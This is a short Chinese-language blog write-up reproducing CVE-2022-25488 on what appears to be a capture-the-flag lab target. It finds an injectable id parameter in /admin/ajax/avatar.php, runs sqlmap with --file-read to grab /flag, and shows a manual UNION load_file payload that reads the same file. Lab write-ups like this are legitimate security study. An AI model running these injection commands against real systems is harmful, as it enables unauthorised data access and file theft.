---
title: CVE-2022-25488
subtitle:
date: 2025-03-14T12:13:30+08:00
slug: bd46488
draft: false
author:
  name: T1ng
  link:
  email:
  avatar: /images/avater.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - CVE
categories:
  - 复现
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: false
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

<!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->



![](images/2745a2b099742c4446fd668420e9ea2b.png)

访问网站发现提示404，

![](images/a442de9815c07d10ffa1cd43b3a11721.png)

尝试访问所给路径/admin/ajax/avatar.php，依然没有任何显示，访问上一路径

![](images/1ccf0ae4708780f319188f82bdd0b5ee.png)

访问其他文件得到报错

![](images/ab1be5fd8475bfc5e3cfcae18dea3f6c.png)

拿到参数id，sqlmap进行尝试

``` Shell
sqlmap -u "http://eci-2ze1ldkkzy8hjpn1egve.cloudeci1.ichunqiu.com/admin/ajax/avatar.php?id=1"
```



![](images/cbb840f42b684ef446954e80ab685f23.png)

得到数据库类型，进行读flag

``` Shell
sqlmap -u "http://eci 2ze1ldkkzy8hjpn1egve.cloudeci1.ichunqiu.com/admin/ajax/avatar.php?id=1" -D "mysql" --file-read "/flag"
```



![](images/5cd3df30766743afc166042079f90002.png)



手工注入
查看avatar.php内容

![](images/d7f9a5e9bffaa598faa8a48d3ab0563b.png)

尝试注入点?id=1和?id=1' ，发现在id=1时源码发生变化

![](images/1d7ca1b0d577027c1bfc151240470eff.png)

再次尝试id=1 and 1=1 ，判断为字符型

![](images/b82417376d2dc6503ee50c95220cd12e.png)

sql报错注入，使id语法错误，回显flag
?id=-1 union (select load_file('/flag'))#

![](images/5ed87b645cfc9859d8ddfa114515d68f.png)

同样拿到flag





